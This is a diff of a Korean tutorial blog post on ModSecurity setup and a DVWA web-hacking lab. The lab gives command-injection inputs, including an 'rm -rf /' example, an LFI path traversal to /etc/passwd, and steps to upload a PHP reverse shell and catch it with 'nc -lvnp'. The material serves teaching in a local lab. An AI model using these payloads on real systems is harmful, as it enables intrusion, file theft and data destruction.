@@ -76,21 +76,29 @@ dvwa로 취약한 웹 어플리케이션 서버를 돌리고, modsecurity를 사
 
 
 위 과정을 통해 ModSecurity 환경 설정을 마쳤다. 이후  
-•`curl -X GET http://127.0.0.1/?testparam=test`를 cli에 입력  
+- `curl -X GET http://127.0.0.1/?testparam=test`를 cli에 입력  
 혹은  
-•`http://127.0.0.1/?testparam=test`를 브라우저에 입력  
-하면 *403 Forbidden*(접근 거부) 페이지를 확인할 수 있다. 
+- `http://127.0.0.1/?testparam=test`를 브라우저에 입력  
+
+
+하면 *<b><font size=4>403 Forbidden(접근 거부)페이지</font></b>* 확인이 가능하다. 
+
 ![403 forbidden image](https://jisoo449.github.io/jisu_sec/assets/images/post/403-forbidden.png)
 
-이는 위에서 추가한 규칙 중 `testparam "@contains test" ..."id:9999999,deny,... ` 에 해당하는 것이다. 
-testparam의 인자값으로 test가 입력되어 요청이 들어올 시 이를 deny하고, 403 상태값을 리턴하라는 규칙에 따라 testparam에 test를 넣으면 Forbidden된 결과값이 출력되는 것이다. 
+<br/>
+이는 위에서 추가한 규칙 중 `testparam "@contains test" ..."id:9999999,deny,... ` 에 해당하는 것이다.  
+
+해당 규칙에 따르면 `testparam`의 인자값으로 test가 입력되어 요청이 들어올 시 이를 deny하고, 403 상태값을 리턴해야 한다.  
+
+testparam에 test를 넣으면 Forbidden된 결과값이 출력되는 것이다. 
 
 만약 위 인자값을 'test'를 제외한 아무 값이나 넣으면 정상적인 페이지가 리턴된다. 
 ![Apache success page](https://jisoo449.github.io/jisu_sec/assets/images/post/apache-browser.png)
 
 
 ### 4. modsecurity 룰 확인
-modsecurity의 룰은 여러 방법으로 확인할 수 있다. 그 중 대표적으로 modsecurity.conf 파일을 확인하는 방법과 rules 디렉토리를 확인하는 방법이 있다. 
+modsecurity의 룰은 여러 방법으로 확인할 수 있다. 그 중 대표적으로 modsecurity.conf 파일을 확인하는 방법과 rules 디렉토리를 확인하는 방법이 있다.  
+
 룰은 conf 파일에서 개별로 추가하는 것이 아닌 rules 디렉토리에 있는 분류에 따라 추가하는 것이 권장된다.
 
 #### 4.1. 구성 파일
@@ -169,7 +177,7 @@ e|2024)|%32(?:%(?:%6|4)5|E)|c0(?:%[256aef]e|\.))|\.(?:%0[01]|\?)?|\?\.?|0x2e){2}
 
 웹에는 다양한 취약점이 존재한다. dvwa를 사용하여 웹 모의해킹을 실시하고, 웹의 취약점에 대해 알아보도록 하자.  
 
-이를 하기에 앞서 dvwa의 security level을 조정하여 실습에 알맞은 환경을 구성하자. 아래 순서에 따라 security level을 조정하라.    
+이를 하기에 앞서 dvwa의 security level을 조정하여 실습에 알맞은 환경을 구성하자. 아래 순서에 따라 security level을 조정하라.
 1. `etc/modsecurity/modsecurity.conf` 의 7번째 라인 `SecRuleEngine On`을 `Off`로 변경  
 2. `systemctl restart apache2`를 입력하여 시스템을 재시작  
 3. `dvwa-start` 입력하여 dvwa 시작  
@@ -209,8 +217,8 @@ if( isset( $_POST[ 'Submit' ]  ) ) {
 
 ?>
 ```
-1. `$target = $_REQUEST[ 'ip' ]; ` : 사용자가 입력한 ip값을 가져온다.  
-2.  `$cmd = shell_exec( 'ping  ' . $target ); ` : 웹서버의 cmd창에 사용자에게 입력받은 ip로 ping을 보내는 코드를 입력한다.  
+1. `$target = $_REQUEST[ 'ip' ];` : 사용자가 입력한 ip값을 가져온다.  
+2. `$cmd = shell_exec( 'ping  ' . $target );` : 웹서버의 cmd창에 사용자에게 입력받은 ip로 ping을 보내는 코드를 입력한다.  
 위의 상황에서 만약 사용자가 '8.8.8.8; rm -rf /'를 입력한다면 'rm -rf /' 가 실행되면서 서버의 모든 데이터가 삭제되는 보안 문제가 발생할 수 있다.   
 
 **Command Injection 취약점을 검증하는 방법은 기호를 사용하는 것이다.** 취약점 검증에 사용되는 기호는 아래 같다.  
@@ -223,7 +231,7 @@ if( isset( $_POST[ 'Submit' ]  ) ) {
 
 dvwa의 command injection 페이지로 이동하여 입력칸에 ;ls 를 입력 해 보자.  
 ![DVWA command injection](https://jisoo449.github.io/jisu_sec/assets/images/post/dvwa-command-injection.png)
-위와 같이 명령어가 실행되어 위 페이지가 존재하는 디렉토리 내의 모든 파일이 출력된 것을 확인할 수 있다.  
+명령어가 실행되어 위 페이지가 존재하는 디렉토리 내의 모든 파일이 출력된 것을 확인할 수 있다.  
 
 Command Injection 취약점은 네트워크 장비의 관리자 페이지(라우터, 스위치, 공유기 등)에서 자주 발견된다.(command injection은 일반적인 웹에서는 확인되지 않는다.) 따라서 Command Injection 취약점에 대한 보호는 WEB 서버 뿐만 아니라 모든 레벨(대역)에서 수행해야 한다. 
 
@@ -232,29 +240,35 @@ Command Injection 취약점은 네트워크 장비의 관리자 페이지(라우
 >- 취약점 원인: include, locate, show, content, action 등의 함수에서 발생
 >- LFI(Local File Inclusion), RFI(Remote File Inclusion)로 나뉨
 
-공격 유형으로는 LFI와 RFI가 있다. 각각에 대해 취약점 검증을 해 보자  
+공격 유형으로는 LFI와 RFI가 있다. 각각에 대해 취약점 검증을 해 보자.  
 
 <br/>
 
-**LFI**  
+<b><font size=4>LFI</font></b>  
 - 파라미터 인자값 입력 방식 공격  
 - `../../../../../`  이나 `file://` 의 형식을 사용해 특정 위치 파일 참조  
 - `?page=file1.php` 과 같은 **GET 요청 방식(쿼리스트링)은 취약점 확률이 높음.**  
 - 타겟 서버에 저장된 파일을 열람하는 수준에서 그침  
 - 취약점 확인 방법으로는 URL을 통한 확인방법과 소스코드를 통한 확인 방법이 있다.
+
 	- 취약점 확인 방법1. URL  
+
 		![URL을 통한 취약점 확인](https://jisoo449.github.io/jisu_sec/assets/images/post/url-lfi.png)
 		`http://127.0.0.1:42001/vulnerabilities/fi/?page=file1.php` 를 살펴보면 get 메소드에 의해 페이지가 실행되는 것을 확인할 수 있다.   
+
+
 	- 취약점 확인 방법2. 소스코드  
+
 		`$file = $_GET[ 'page' ];`는 HTTP GET 요청을 통해 전달된 'page'의 값을 '$file'에 할당한다는 의미이다. 즉, GET이 취약점임을 확인할 수 있다.
 		![Check LFI by source code](https://jisoo449.github.io/jisu_sec/assets/images/post/code-lfi.png)
+
 - 취약점 실습  
 	`http://127.0.0.1:42001/vulnerabilities/fi/?page=../../../../../etc/passwd` 를 입력하면 서버의 etc/passwd가 그대로 출력되는 것을 확인할 수 있다. 
 	![exposed pwd](https://jisoo449.github.io/jisu_sec/assets/images/post/exposed-pwd.png)  
 
 <br/>
 
-**RFI**
+<b><font size=4>RFI</font></b>
 - Request_Body 필드에 입력
 - http://~ 과 같은 원격지 주소로 취약점 점검
 - 공격자가 만들어둔 취약한 페이지를 타겟 시스템으로 임포트하여 실행 -> REC 공격으로 연계 가능
@@ -264,18 +278,24 @@ Command Injection 취약점은 네트워크 장비의 관리자 페이지(라우
 
 *※모든 공격들은 encoding을 신경써야 한다.
 
+<br/>
+
 #### 5.3. File Upload
 >- 게시판의 업로드 기능을 통해 악성 파일을 업로드하여 실행
 >- 취약점: 확장자 기반의 필터링, 헤더 정보에 컨텐츠 타입 필터링
 >- 취약점 검증: php, sh, html 등 확장자를 가지는 파일을 업로드 해 보면서 확인 
->- FileUpload는 게시판 뿐만 아니라 통신 메소드(GET, POST, PUT, DELETE, OPTION)를 통해서도 강제 업로드 할 수 있다. 
+>- FileUpload는 게시판 뿐만 아니라 통신 메소드(GET, POST, PUT, DELETE, OPTION)를 통해서도 강제 업로드 할 수 있다.  
 
-앞서 말했듯이 File Upload 공격은 게시판의 업로드 기능을 통해 악성 파일을 업로드하여 실행된다. 통신 메소드를 통해 공격이 시행되므로 다음과 같은 명령어를 사용해서 메소드 허용 여부를 확인한다.  
-• `curl -X OPTIONS -v http://127.0.0.1:42001/index.php`  
-• `curl -X OPTIONS -v http://vulnweb.com`  
+File Upload 공격은 게시판의 업로드 기능을 통해 악성 파일을 업로드하여 실행된다. 통신 메소드를 통해 공격이 시행되므로 다음과 같은 명령어를 사용해서 메소드 허용 여부를 확인한다.
+
+- `curl -X OPTIONS -v http://127.0.0.1:42001/index.php`  
+- `curl -X OPTIONS -v http://vulnweb.com`  
+
 위 명령어를 통해서 확인할 수 있는 것은 PUT 메소드 허용 여부에 따라 발생하는 취약점이다. 다만 PUT 메소드가 허용되어 있어도 해당 디렉토리에 쓰기 권한이 활성화 되어 있지 않다면 사용할 수 없다.  
+
 이 외에도 다른 통신 메소드의 취약점을 확인하고 싶다면 각각의 통신 메소드가 요구하는 path 규격에 맞추어 url을 수정하면 된다. 이에 관련한 취약점 진단을 하려 한다면 일반적인 도메인 뿐만 아니라 서브 도메인까지 체크해야 한다. 
 
+아래 순서를 따라 취약점 코드가 포함된 php파일을 dvwa에 업로드하는 실습을 진행 해 보자. 
 1. `cd /home/kali/Desktop`
 2. `cp /usr/share/webshells/php/php-reverse-shell.php ./`
 3. `ip ad` 로 ip 확인
@@ -285,8 +305,7 @@ Command Injection 취약점은 네트워크 장비의 관리자 페이지(라우
 	`../../hackable/uploads/php-reverse-shell.php succesfully uploaded!` 와 같은 문장 출력됨. 
 	위에 나온 경로를 
 7. 다시 터미널로 돌아와서 `nc -lvnp {php파일에서 설정한 포트번호}`
-![Listening...](https://jisoo449.github.io/jisu_sec/assets/images/post/file-upload-listening.png)
-
+	![Listening...](https://jisoo449.github.io/jisu_sec/assets/images/post/file-upload-listening.png)
 
 127.0.0.1:42001/hackable/uploads/php-reverse-shell.php 입력하면 아까 터미널에서 쉘 연결된 걸 확인 가능 
 
